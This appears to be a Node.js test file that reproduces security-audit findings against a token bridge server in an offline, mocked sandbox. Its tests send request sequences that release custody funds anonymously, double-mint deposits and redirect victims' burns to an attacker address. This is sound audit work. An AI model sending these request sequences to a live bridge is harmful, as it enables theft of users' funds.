// Offline audit reproductions. PASS means the named vulnerability was reproduced.
// No network, wallets, external database, HTTP listener, or real signing is used.
// Usage: node --test reproduce.cjs /path is not supported by node:test;
// instead use STAMPY_AUDIT_SOURCE=/path/to/checkout node --test reproduce.cjs
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const { DatabaseSync } = require('node:sqlite');
const ROOT = process.env.STAMPY_AUDIT_SOURCE || '/private/tmp/stampyswap-audit-2345961';
const UNIT = 10n ** 18n;
const token = '0x' + '1'.repeat(40);
const victim = '0x' + '2'.repeat(40);
const attacker = '0x' + '3'.repeat(40);
function units(s, dp = 18) {
  const [i, f = ''] = String(s).split('.');
  return BigInt(i + f.padEnd(Number(dp), '0').slice(0, Number(dp)));
}
function load(file, req, globals = {}) {
  const module = { exports: {} };
  const context = vm.createContext({ module, exports: module.exports, require: req,
    __dirname: ROOT, process: { env: {} }, console: { log() {} }, Buffer,
    AbortController, TextEncoder, setTimeout, clearTimeout, ...globals });
  vm.runInContext(fs.readFileSync(path.join(ROOT, file), 'utf8'), context, { filename: file });
  return { exports: module.exports, context };
}
async function fixture({ protocol = 'src-20', decimals = 8, collateral = '100', circulating = '100', chain = 'base' } = {}) {
  const db = new DatabaseSync(':memory:');
  db.exec(`
    CREATE TABLE canonical_assets(id INTEGER PRIMARY KEY, exact_ticker TEXT, source_protocol TEXT, max_supply TEXT, decimals INTEGER, whitelisted INTEGER, deploy_tx TEXT);
    CREATE TABLE representations(id INTEGER PRIMARY KEY, canonical_id INTEGER, dest_chain TEXT, dest_address TEXT, circulating_supply TEXT, status TEXT, updated_at INTEGER, dest_symbol TEXT, authority_model TEXT);
    CREATE TABLE collateral_ledger(id INTEGER PRIMARY KEY, canonical_id INTEGER, direction TEXT, amount TEXT, dest_chain TEXT, btc_txid TEXT UNIQUE, vault_address TEXT, confirmations INTEGER, status TEXT, created_at INTEGER, dest_tx TEXT);
    CREATE TABLE stamp_bridges(id INTEGER PRIMARY KEY, src20_tick TEXT, stamp_asset TEXT, stamp_protocol TEXT, ratio INTEGER, burn_address TEXT, enabled INTEGER);
    CREATE TABLE bridge_ops(id INTEGER PRIMARY KEY, src20_tick TEXT, stamp_asset TEXT, amount TEXT, burn_txid TEXT UNIQUE, user_address TEXT, release_txid TEXT, status TEXT, created_at INTEGER);
  `);
  db.prepare('INSERT INTO canonical_assets VALUES (1,?,?,?,?,1,?)').run('COIN', protocol, '1000000', decimals, 'deploy');
  db.prepare("INSERT INTO representations(id,canonical_id,dest_chain,dest_address,circulating_supply,status) VALUES(1,1,?,?,?,'CANONICAL')").run(chain, token, circulating);
  if (collateral !== '0') db.prepare("INSERT INTO collateral_ledger(canonical_id,direction,amount,btc_txid,status) VALUES(1,'deposit',?,'initial','confirmed')").run(collateral);
  const state = { releases: [], mints: [], failMint: false, failDb: false, vaultBalance: '101',
    sends: [{ source: 'attacker-btc', destination: 'vault', status: 'valid', quantity: '1', tx_hash: 'deposit', block_index: 10 }],
    src: { op: 'TRANSFER', tick: 'COIN', creator: 'attacker-btc', destination: 'vault', amt: '10', block_index: 10 },
    receipt: { status: 1, logs: [{ address: token, topics: ['TRANSFER', '0x' + victim.slice(2).padStart(64, '0'), '0x' + '0'.repeat(64)], data: '0x' + (10n * UNIT).toString(16) }] } };
  const json = body => ({ ok: true, json: async () => body, text: async () => JSON.stringify(body) });
  async function fetch(url) {
    const u = new URL(url);
    if (u.pathname.startsWith('/api/v2/src20/tx/')) return json({ data: { ...state.src, tx_hash: decodeURIComponent(u.pathname.split('/').pop()) }, last_block: 30 });
    if (u.pathname.endsWith('/balances')) return json({ result: ['COIN', 'STAMP'].map(asset => ({ asset, quantity: state.vaultBalance })) });
    if (u.pathname.endsWith('/sends')) return json({ result: state.sends });
    if (u.pathname.endsWith('/blocks/last')) return json({ result: { block_index: 30 } });
    throw new Error('Unexpected external request BLOCKED: ' + url);
  }
  const cp = load('counterparty.js', () => { throw Error('Unexpected require'); }, { fetch }).exports;
  const acme = load('acme.js', () => { throw Error('Unexpected require'); }, { fetch }).exports;
  const ethers = { id: () => 'TRANSFER', parseUnits: units };
  const evm = load('evm-mint.js', name => {
    if (name === 'ethers') return { ethers };
    if (name === './evm-signer') return { address: attacker, provider: () => ({ getTransactionReceipt: async () => state.receipt }) };
    if (name === './erc20-artifact.json') return JSON.parse(fs.readFileSync(path.join(ROOT, 'erc20-artifact.json')));
    throw Error('Unexpected require: ' + name);
  }).exports;
  evm.deployAndMint = async args => {
    if (state.failMint) throw Error('injected signer outage');
    state.mints.push(args);
    return { contract: token, txHash: 'mock-mint-' + state.mints.length };
  };
  const routes = new Map();
  const express = () => ({ use() {}, get: (p, ...f) => routes.set('GET ' + p, f.at(-1)),
    post: (p, ...f) => routes.set('POST ' + p, f.at(-1)), listen() {} });
  express.json = express.static = () => () => {};
  const custody = { depositAddress: async () => 'vault', isLive: () => true,
    redeem: async args => { state.releases.push(args); return { txid: 'mock-release-' + state.releases.length, released: true }; } };
  const dependencies = {
    express, path, crypto: require('node:crypto'), tweetnacl: {}, bs58: { default: {} },
    './sol-mint': {}, './evm-mint': evm, './amm': {}, './custody': custody,
    './counterparty': cp, './acme': acme, './prices': {}, './squads': null, './safe': null,
    // These are assumed valid signatures from the named test source. No crypto bypass is alleged.
    'bip322-js': { Verifier: { verifySignature: (address, message, sig) => sig === 'valid:' + address } },
    fs: { existsSync: () => false }, ethers,
  };
  const query = async (sql, params = []) => db.prepare(sql).all(...params);
  const exec = async (sql, params = []) => {
    if (state.failDb && sql.startsWith('UPDATE representations')) { state.failDb = false; throw Error('injected database outage after mint'); }
    return db.prepare(sql).run(...params);
  };
  const { context } = load('server.js', name => {
    if (!(name in dependencies)) throw Error('Unexpected require: ' + name);
    return dependencies[name];
  }, { fetch, process: { env: { VAULT_DEPOSIT_ADDRESS: 'vault', OPERATOR_TOKEN: 'fixture-operator' } },
    setInterval: () => ({ unref() {} }), __query: query, __exec: exec });
  vm.runInContext('dbQuery = __query; dbExec = __exec', context);
  await Promise.resolve();
  async function call(route, body = {}, params = {}, headers = {}) {
    const response = { code: 200, body: null, status(n) { this.code = n; return this; }, json(j) { this.body = j; return this; } };
    await routes.get(route)({ body, params, headers, query: {} }, response);
    return response;
  }
  const claim = (extra = {}) => ({ tick: 'COIN', amount: '10', txid: 'deposit', chain: 'base', receive_address: attacker, source_address: 'attacker-btc', binding_sig: 'valid:attacker-btc', ...extra });
  return { state, db, call, claim, evm };
}

test('CONFIRMED F01: custody release accepts anonymous caller without a burn', async () => {
  const f = await fixture();
  const r = await f.call('POST /api/custody/redeem', { tick: 'COIN', amount: '50', chain: 'base', to: 'attacker-btc' });
  assert.equal(r.code, 200); assert.equal(f.state.releases[0].toAddress, 'attacker-btc');
  assert.equal(f.db.prepare('SELECT circulating_supply FROM representations').get().circulating_supply, '50');
});
test('CONFIRMED F02: legacy redeem fabricates a withdrawal and reopens XCP mint headroom', async () => {
  const f = await fixture({ protocol: 'counterparty', decimals: 0 });
  assert.equal((await f.call('POST /api/redeem', { tick: 'COIN', amount: '100', chain: 'base' })).code, 200);
  assert.equal(f.state.releases.length, 0);
  const r = await f.call('POST /api/custody/verify-deposit', f.claim({ amount: '100' }));
  assert.equal(r.code, 200); assert.equal(f.state.mints[0].recipient, attacker);
});
test('CONFIRMED F03: public txid rewrite makes an already minted deposit claimable twice', async () => {
  const f = await fixture({ collateral: '0', circulating: '0' });
  assert.equal((await f.call('POST /api/custody/verify-deposit', f.claim())).code, 200);
  const row = f.db.prepare("SELECT id FROM collateral_ledger WHERE direction='deposit'").get();
  assert.equal((await f.call('POST /api/bridge/intent/:id/txid', { txid: 'replacement' }, { id: row.id })).code, 200);
  assert.equal((await f.call('POST /api/custody/verify-deposit', f.claim())).code, 200);
  assert.equal(f.state.mints.length, 2);
  assert.equal(f.db.prepare('SELECT circulating_supply FROM representations').get().circulating_supply, '20');
});
test('CONFIRMED F04: historical one-unit XCP depositor claims another depositor balance', async () => {
  const f = await fixture({ protocol: 'counterparty', decimals: 0, collateral: '0', circulating: '0' });
  const r = await f.call('POST /api/custody/verify-deposit', f.claim({ amount: '101' }));
  assert.equal(r.code, 200); assert.equal(f.state.sends[0].quantity, '1');
  assert.equal(f.state.mints[0].amountToken, '101');
});
test('CONFIRMED F05: victim burn is accepted for minting to attacker without authorization', async () => {
  const f = await fixture();
  assert.equal((await f.evm.verifyBurn('base', 'victim-burn', token, '10')).valid, true);
  const r = await f.call('POST /api/move', { tick: 'COIN', amount: '10', from_chain: 'base', to_chain: 'ethereum', burn_txid: 'victim-burn', to_address: attacker });
  assert.equal(r.code, 200); assert.equal(f.state.mints[0].recipient, attacker);
});
test('CONFIRMED F06a: failed deposit mint cannot be retried', async () => {
  const f = await fixture({ collateral: '0', circulating: '0' });
  f.state.failMint = true;
  assert.equal((await f.call('POST /api/custody/verify-deposit', f.claim())).code, 502);
  f.state.failMint = false;
  const retry = await f.call('POST /api/custody/verify-deposit', f.claim());
  assert.equal(retry.code, 409); assert.match(retry.body.error, /already credited/); assert.equal(f.state.mints.length, 0);
});
test('CONFIRMED F06b: failed cross-chain mint says retryable but rejects retry', async () => {
  const f = await fixture();
  const request = { tick: 'COIN', amount: '10', from_chain: 'base', to_chain: 'ethereum', burn_txid: 'victim-burn', to_address: victim };
  f.state.failMint = true;
  const first = await f.call('POST /api/move', request);
  assert.equal(first.code, 502); assert.match(first.body.error, /retryable/);
  f.state.failMint = false;
  const retry = await f.call('POST /api/move', request);
  assert.equal(retry.code, 409); assert.match(retry.body.error, /already processed/);
});
test('CONFIRMED F07: database failure after mint permits duplicate operator retry', async () => {
  const f = await fixture({ collateral: '10', circulating: '0' });
  const req = { tick: 'COIN', amount: '10', chain: 'base', receive_address: attacker };
  f.state.failDb = true;
  assert.equal((await f.call('POST /api/mint', req, {}, { 'x-operator-token': 'fixture-operator' })).code, 500);
  assert.equal((await f.call('POST /api/mint', req, {}, { 'x-operator-token': 'fixture-operator' })).code, 200);
  assert.equal(f.state.mints.length, 2);
  assert.equal(f.db.prepare('SELECT circulating_supply FROM representations').get().circulating_supply, '10');
});
test('CONFIRMED F08: Base mainnet deposit is consumed before unsupported-chain rejection', async () => {
  const f = await fixture({ collateral: '0', circulating: '0' });
  const r = await f.call('POST /api/custody/verify-deposit', f.claim({ chain: 'base-mainnet' }));
  assert.equal(r.code, 400); assert.match(r.body.mint.error, /unsupported destination/);
  assert.equal(f.db.prepare("SELECT COUNT(*) AS n FROM collateral_ledger WHERE direction='deposit'").get().n, 1);
});
test('CONFIRMED F09: one indivisible ACME deposit backs 1.9 representation units', async () => {
  const f = await fixture({ protocol: 'acme', decimals: 0, collateral: '0', circulating: '0' });
  const r = await f.call('POST /api/custody/verify-deposit', f.claim({ amount: '1.9' }));
  assert.equal(r.code, 200); assert.equal(f.state.mints[0].amountToken, '1.9');
  assert.equal(f.state.sends[0].quantity, '1');
});
test('CONFIRMED F10: anonymous partial stamp-bridge claim consumes a victim full burn', async () => {
  const f = await fixture();
  f.db.exec("INSERT INTO stamp_bridges VALUES(1,'COIN','STAMP','counterparty',1,'burn-address',1)");
  f.state.src = { ...f.state.src, creator: 'victim-btc', destination: 'burn-address', amt: '100' };
  const req = { src20_tick: 'COIN', amount: '1', burn_txid: 'victim-burn', user_address: 'victim-btc' };
  const first = await f.call('POST /api/stampbridge/execute', req);
  assert.equal(first.code, 200); assert.equal(f.state.releases[0].amount, '1');
  assert.equal((await f.call('POST /api/stampbridge/execute', { ...req, amount: '100' })).code, 409);
});
